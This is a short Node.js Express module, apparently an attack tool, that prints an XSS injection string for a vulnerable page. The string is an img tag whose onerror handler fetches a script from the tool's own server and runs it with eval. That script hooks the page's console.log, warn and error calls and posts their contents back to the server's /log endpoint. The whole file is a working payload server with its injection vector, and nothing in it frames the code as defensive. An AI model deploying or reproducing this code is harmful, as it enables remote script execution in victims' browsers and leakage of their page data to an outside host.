const express = require('express')
const cors = require('cors')

function startConsoleCatcher(host, port) {
    const app = express()

    app.use(cors())
    app.use(express.json());
    app.use(express.urlencoded({ extended: true }));

    const shell = `(() => {
        function hook(obj, funcname, callback) {
            const original = obj[funcname];
            obj[funcname] = function () {
                callback.apply(this, arguments);
                return original.apply(this, arguments);
            }
        }
        function sendLog(type) {
            return function(...args) {
                fetch('http://${host}:${port}/log', {
                    method: "POST",
                    body: JSON.stringify({type, res: args.join(' ')}),
                    headers: {
                        'Content-Type': 'application/json'
                    }
                });
            }
        }
        hook(console, 'log', sendLog('log'))
        hook(console, 'warn', sendLog('warn'))
        hook(console, 'error', sendLog('error'))
    })()
    `

    const injection_img = `<img src=x onerror="fetch('http://${host}:${port}/shell').then(t=>t.text()).then(c=>eval(c))" />`

    app.get('/shell', function (req, res) {
        res.send(shell)
    })

    app.post('/log', function (req, res) {
        console.log(req.body.type, req.body.res)
        res.send('')
    })

    app.listen(port, () => {
        console.log(`IMG Injection: ${injection_img}`)
    });
}

module.exports = {
    startConsoleCatcher
}
